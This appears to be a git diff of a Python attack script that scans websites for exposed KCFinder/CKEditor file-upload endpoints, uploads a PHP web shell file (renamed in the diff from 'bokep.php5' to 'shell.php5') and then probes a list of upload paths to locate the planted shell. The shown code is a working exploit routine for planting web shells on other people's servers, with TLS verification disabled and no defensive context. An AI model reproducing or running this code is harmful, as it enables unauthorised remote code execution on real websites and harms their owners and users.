@@ -49,9 +49,9 @@ def ngaco():
                                     dd = requests.get(fak, allow_redirects=False,verify=False)
                                     if dd.status_code == 200:
                                         print(fak+' ==>\033[1;32;40m Found!\033[0;37;40m')
-                                        shell = {'Filedata':open('bokep.php5', 'rb')}
+                                        shell = {'Filedata':open('shell.php5', 'rb')}
                                         tusuk = requests.post(fak, files=shell, headers=Agent, verify=False)
-                                        n = {'/adminpanel/ckeditor/kcfinder/upload/files/bokep.php5','/upload/files/bokep.php5','/admin/kcfinder/upload/files/bokep.php5','/kcfinder/upload/files/bokep.php5','/assets/kcfinder/upload/files/bokep.php5','/images/upload/files/bokep.php5','/admin/upload/files/bokep.php5'}
+                                        n = {'/adminpanel/ckeditor/kcfinder/upload/files/shell.php5','/upload/files/shell.php5','/admin/kcfinder/upload/files/shell.php5','/kcfinder/upload/files/shell.php5','/assets/kcfinder/upload/files/shell.php5','/images/upload/files/shell.php5','/admin/upload/files/shell.php5'}
                                         for jnck in n:
                                             ls = jnck.replace('\n\n','')
                                             fak2 = fak
@@ -82,4 +82,3 @@ def ngaco():
 
 if __name__ == '__main__':
     ngaco()
-
